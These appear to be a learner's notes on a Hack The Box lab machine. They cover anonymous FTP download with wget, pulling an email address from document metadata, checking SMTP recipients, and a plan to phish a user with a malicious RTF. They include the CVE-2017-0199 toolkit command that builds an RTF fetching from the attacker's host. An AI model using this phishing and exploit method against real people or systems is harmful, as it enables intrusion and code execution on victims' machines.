
```
Name: HTB
Domain Sid: S-1-5-21-2648318136-3688571242-2924127574
```

FTP
```
wget -m ftp://anonymous:anonymous@10.10.10.77 #Donwload all
```
![[Pasted image 20240507024218.png]]

readme.txt
```
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

AppLocker.docx
```
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

```
LAPTOP12.HTB.LOCAL
```


Just a wild guess as we want Gmail to enter it in the SMTP server and even kerbrute was not working this time.
```
exiftool Windows\ Event\ Forwarding.docx
```

```
nico@megabank.com
```

![[Pasted image 20240507085045.png]]


It is clear that we have to take the mail path to get something out of it. And if we recall there was a note that they are processing some files with .exe , bat so which means we have to draft a Phising mail to send to Nico and assume that our reverse shell get's executed and we get the shell.

But for that i have take some hello from the walkthrough and how to do it.

![[Pasted image 20240509125558.png]]

We can send the mail to nicko using RCPT and we got a OK response.

Will not make a malicious macro word file and wait for it to execute as the user is not using Microsoft word (i.e. using wordpad)

But will learn how to do that for future use.

Will open the insert tab
![[Pasted image 20240509130445.png]]

In that will select Quick Parks -> Field 
![[Pasted image 20240509130524.png]]

Everytime user opens the image the words will try to download that image from the URL that we have given.
![[Pasted image 20240509130708.png]]

Now if we think a little more RTF (i.e. rtf format procedures) was mentioned in the note. So will find if there are any exploits related to that.
![[Pasted image 20240509130929.png]]

Will go with the 1st result aka CVE 2017
https://github.com/bhdresh/CVE-2017-0199.git

![[Pasted image 20240509131155.png]]

Payload
```
python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u http://10.10.16.20 -t RTF -x 0
```
we are using -x 0 cuz we don't want any obfuscation
![[Pasted image 20240509131543.png]]

